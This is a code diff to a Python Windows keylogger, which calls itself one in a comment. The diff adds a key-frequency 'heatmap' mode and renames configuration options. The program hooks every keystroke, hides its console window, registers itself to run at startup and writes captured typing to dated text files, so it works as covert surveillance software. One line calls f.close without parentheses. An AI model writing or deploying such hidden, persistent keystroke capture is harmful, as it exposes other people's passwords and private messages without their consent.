@@ -25,8 +25,11 @@ DIR_PATH = os.path.dirname(os.path.realpath(sys.argv[0]))
 
 # Config Dict
 config = {}
-# Buffer for characters
+# Buffer for text
 line_buffer = ''
+# Buffer for Heatmap
+heatmap_buffer = {}
+heatmap_order = []
 # Paused logging
 paused = False
 
@@ -45,10 +48,10 @@ def read_config():
 read_config()
 
 # Disallowing multiple instances
-mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start' + ('' if not config["mode"] == 'debug' else '_debug'))
+mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start' + ('' if not config["output"] == 'debug' else '_debug'))
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
-    if not config["hide"] or (config["mode"] == 'debug'):
+    if not config["hide"] or (config["output"] == 'debug'):
         print("Multiple instances are not allowed")
     exit(0)
 
@@ -67,7 +70,7 @@ def add_to_startup():
     try:
         SetValueEx(key2change, LOGGER_NAME, 0, REG_SZ, reg_value)
     except Exception as e:
-        if config["mode"] == 'debug':
+        if config["output"] == 'debug':
             print(e)
 
 # Remove from startup f
@@ -79,59 +82,63 @@ def remove_from_startup():
     try:
         DeleteValue(key2change, LOGGER_NAME)  
     except Exception as e:
-        if config["mode"] == 'debug':
+        if config["output"] == 'debug':
             print(e, ". Not critical if logger isn't applied to startup")
 
 # Debug logger
 def log_debug():
-    global line_buffer
-    line_buffer = line_buffer.encode()
-    print(line_buffer)
-    line_buffer = ''
-    return True
+    global config, line_buffer, heatmap_buffer
+    if config["mode"] == "heatmap":
+        for k, v in heatmap_buffer.items():
+            print(v)
+        return True
+    elif config["mode"] == "text":
+        line_buffer = line_buffer.encode()
+        print(line_buffer)
+        line_buffer = ''
+        return True
+    return False
 
 # Append file with pressed keys
 def log_local():
-    global line_buffer, config
+    global config, line_buffer, heatmap_buffer
     path = join(DIR_PATH, BOOK_PATH)
-    file = join(path, ("" if config["page-prefix"] == "" else config["page-prefix"] + "_")  + "page_" + (date.today() - timedelta(days=1)).strftime('%Y-%m-%d') + ".txt")
     if not exists(path):
-        os.makedirs(path)    
-    f = open(file, "a", encoding='utf8')
-    f.write(line_buffer)
-    f.close
-    line_buffer = ''
-    return True
-
-# Log with configured mode
-def log_it():
-    global line_buffer, config
-    if config["mode"] == "local":
+            os.makedirs(path)  
+    if config["mode"] == "heatmap":        
+        unused = []
+        for k,v in heatmap_buffer.items():
+            if v["mentions"] == 0:
+                unused.append(k)
+        for k in unused:
+            del heatmap_buffer[k]
+        file = join(path, "heatmap.json")
+        with open(file, "w") as write_file:
+            json.dump(heatmap_buffer, write_file, indent=4)
+        return True
+    elif config["mode"] == "text":
         if len(line_buffer) >= config["buffer-size"]:
-            log_local()
-    elif config["mode"] == "debug":
+            file = join(path, ("" if config["page-prefix"] == "" else config["page-prefix"] + "_")  + "page_" + (date.today() - timedelta(days=1)).strftime('%Y-%m-%d') + ".txt")
+            f = open(file, "a", encoding='utf8')
+            f.write(line_buffer)
+            f.close
+            line_buffer = ''
+            return True
+    return False
+
+# Log with configured output
+def log_it():
+    global config
+    if config["output"] == "local":        
+        log_local()
+    elif config["output"] == "debug":
         log_debug()
     return True
 
-def key_callback(event):
-    global line_buffer, paused
+def page_mode(event):
+    global line_buffer
     is_pressed_ctrl = is_pressed('ctrl') or is_pressed('right ctrl')
     is_pressed_alt = is_pressed('alt') or is_pressed('alt gr')
-    
-
-    # while paused no logging
-    if paused:
-        return True
-
-    # event key up 
-    if event.event_type == 'up':
-        return True
-        
-    # Debug Mode
-    if config["mode"] == 'console':
-        line_buffer += event.name + " " + str(event.scan_code)
-        log_debug()
-        return True
 
     key_pressed = ''
     # Key Represention
@@ -145,20 +152,93 @@ def key_callback(event):
     elif not (is_pressed_ctrl | is_pressed_alt):
         if len(event.name) == 1:
             key_pressed = event.name
+    else:
+        return False
 
     line_buffer += key_pressed
     
-    log_it()
-    return True  
+    return log_it()
+
+def heatmap_mode(event):
+    global heatmap_buffer, heatmap_order
+
+    key_pressed = {}
+    # Key Represention
+    if event.name == 'space':
+        key_pressed = {
+            "name": event.name,
+            "scancode": event.scan_code,
+            "value": " "
+        }
+    elif event.name == 'enter':
+        key_pressed = {
+            "name": event.name,
+            "scancode": event.scan_code,
+            "value": "\n"
+        }
+    elif event.name == 'backspace':
+        if len(heatmap_order) > 0:
+            heatmap_buffer[heatmap_order[-1]]["mentions"] = heatmap_buffer[heatmap_order[-1]]["mentions"] - 1
+            heatmap_order.pop()
+    else:
+        if len(event.name) == 1:
+            key_pressed = {
+            "name": event.name,
+            "scancode": event.scan_code,
+            "value": event.name
+        }
+    
+    if not key_pressed == {}:
+        index = key_pressed["name"]
+        if index in heatmap_buffer and "mentions" in heatmap_buffer[index]:
+            heatmap_buffer[index]["mentions"] = heatmap_buffer[index]["mentions"] + 1
+        else:
+            key_pressed["mentions"] = 1
+            heatmap_buffer[index] = key_pressed
+        heatmap_order.append(index)
+            
+    
+    return log_it()
+    
+def key_callback(event):
+    global line_buffer, paused
+
+    # while paused no logging
+    if paused:
+        return False
+    
+    # event key up 
+    if event.event_type == 'up':
+        return False
+    
+    # Console output
+    if config["output"] == 'console':
+        line_buffer += event.name + " " + str(event.scan_code)
+        return log_debug()
+    
+    if config["mode"] == "heatmap":
+         return heatmap_mode(event)
+    elif config["mode"] == "text":
+        return page_mode(event)
+    return False
 
 def pause_logging():
     global paused, line_buffer
-    if not config["hide"] or (config["mode"] == 'debug'):
+    if not config["hide"] or (config["output"] == 'debug'):
         print(LOGGER_NAME + (" paused" if not paused else " continue"))
     paused = not paused
 
+def read_heatmap():
+    if config["mode"] == "heatmap":
+        path = join(DIR_PATH, BOOK_PATH)
+        file = join(path, "heatmap.json")
+        if exists(file) and not os.stat(file).st_size == 0:
+            with open(file, "r") as read_file:
+                global heatmap_buffer
+                heatmap_buffer = json.load(read_file)
+
 def hide():
-    if not config["mode"] == 'debug':
+    if not config["output"] == 'debug':
         # Hide Console
         window = win32console.GetConsoleWindow()
         win32gui.ShowWindow(window, 0)
@@ -167,7 +247,7 @@ def hide():
         print("Console Hide")
 
 def main():
-    if not config["hide"] or (config["mode"] == 'debug'):
+    if not config["hide"] or (config["output"] == 'debug'):
         print(LOGGER_NAME + " started")
     keyboard.hook(key_callback)
     # To Pause the Keylogger (ctrl + alt + p)
@@ -178,7 +258,7 @@ def main():
     keyboard.wait(config["hotkeys"]["exit-hotkey"]) 
     global line_buffer
     log_local()
-    if not config["hide"] or (config["mode"] == 'debug'):
+    if not config["hide"] or (config["output"] == 'debug'):
         print(LOGGER_NAME + " stopped.")
     exit()
 
@@ -193,4 +273,7 @@ if __name__ == '__main__':
     else: 
         remove_from_startup()
 
-main()
+    # Read already saved values 
+    read_heatmap()
+
+    main()
